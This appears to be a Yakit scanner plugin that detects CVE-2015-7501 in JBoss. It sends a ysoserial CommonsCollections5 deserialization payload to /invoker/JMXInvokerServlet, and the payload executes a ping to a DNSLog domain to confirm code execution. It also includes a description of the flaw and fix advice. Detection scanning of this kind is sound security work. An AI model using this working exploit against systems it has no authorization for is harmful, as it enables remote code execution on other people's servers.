yakit.AutoInitYakit()
log.setLevel("info")


handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    server,token,err = risk.NewDNSLogDomain()
    data = str.f("ping -c 1 %s", server)
    payload,err = yso.GetCommonsCollections5JavaObject(data)
    payload = string(yso.ToBytes(payload)~)

    packet = `
POST /invoker/JMXInvokerServlet HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{{params(payload)}}`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    sleep(2)
    
    dnsdata,dnserr = risk.CheckDNSLogByToken(token)
    if dnserr != nil {
        yakit.Error("Not Found JBoss JMXInvokerServlet 反序列化漏洞")
        return
    }

    // dump(rsp)
    if len(rsp) > 0 {
        if len(dnsdata) > 0 {
            yakit.Info("%v JBoss JMXInvokerServlet 反序列化漏洞", addr)
            risk.NewRisk(
                addr,risk.title("JBoss JMXInvokerServlet 反序列化漏洞"),
                risk.severity("high"),
                risk.titleVerbose("JBoss JMXInvokerServlet 反序列化漏洞"),
                risk.type("unserialize"),
                risk.description(<<<DESC
漏洞描述(Desc):

JBoss JMXInvokerServlet 反序列化漏洞(CVE-2015-7501)是 JBoss 应用服务器中的一个严重安全漏洞。攻击者可以通过向 JMXInvokerServlet 发送特制的序列化 Java 对象,利用 Java 反序列化机制执行任意代码。

具体来说:

JMXInvokerServlet 在处理请求时会对传入的数据进行反序列化。

攻击者可以构造恶意的序列化对象,包含可执行代码。

当这些对象被反序列化时,其中的恶意代码就会被执行。

攻击者可以利用这一点在目标服务器上执行任意命令,获取系统控制权。

受影响版本包括 JBoss AS 4.x 和 5.x。
DESC),
risk.solution(<<<SOL
修复建议(Fix):

升级 JBoss 到最新版本,官方已在新版本中修复了该漏洞。

如无法升级,可以通过以下方式缓解风险:

禁用 JMXInvokerServlet,在 web.xml 中注释掉相关配置。

限制对 /invoker 和 /jmx-console 等路径的访问,只允许可信 IP。

在反序列化处理前增加白名单验证,只允许反序列化可信类。

启用 Web 应用防火墙(WAF),过滤可疑的序列化数据。

定期进行安全扫描和渗透测试,及时发现并修复漏洞。

加强网络隔离,将 JBoss 服务器置于内网,避免直接暴露在公网。

保持系统和第三方组件的及时更新,关注相关安全公告。

SOL),
            )
        }
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), "jboss") {
            handleCheck(result.Target,result.Port)  
        }
    }
    
}
